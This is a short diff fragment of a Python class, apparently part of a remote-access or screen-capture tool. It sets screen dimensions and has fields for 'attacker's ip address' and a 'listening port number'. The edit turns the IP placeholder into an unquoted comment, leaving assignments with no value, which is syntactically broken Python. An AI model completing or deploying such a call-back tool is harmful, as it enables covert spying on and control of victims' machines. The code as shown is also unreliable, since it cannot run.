@@ -40,7 +40,7 @@ class lrygg:
         self.scrwid = self.scrsi.width
         self.scrhei = self.scrsi.height
         self.stop_flag = False
-        self.ipadd = '#Your(attacker's ip address'
+        self.ipadd = #Your(attacker's) ip address
         self.portn = #listening port number
         
     def pdfdoc(self):
